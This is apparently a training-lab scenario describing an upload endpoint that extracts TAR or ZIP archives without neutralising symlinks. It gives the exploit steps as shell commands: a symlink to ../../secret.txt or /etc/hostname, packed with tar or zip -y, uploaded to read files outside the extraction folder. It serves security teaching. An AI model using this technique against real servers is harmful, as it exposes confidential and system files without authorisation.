File Upload · Scenario 25 — Archive Symlink File Read
=====================================================

The server extracts uploaded archives (TAR or ZIP) into uploads/extracted/
without neutralizing symbolic link entries. A symlink pointing outside the
extraction folder allows reading sensitive files (such as secret.txt or /etc/hostname)
when accessed through the web server.

Goal:
1. Create a symlink named link.txt pointing to ../../secret.txt (or /etc/hostname):
   ln -s ../../secret.txt link.txt
   tar -cf exploit.tar link.txt
   # or: zip -y exploit.zip link.txt
2. Upload exploit.tar or exploit.zip in the scenario form.
3. Observe the extracted target content displayed on the page.
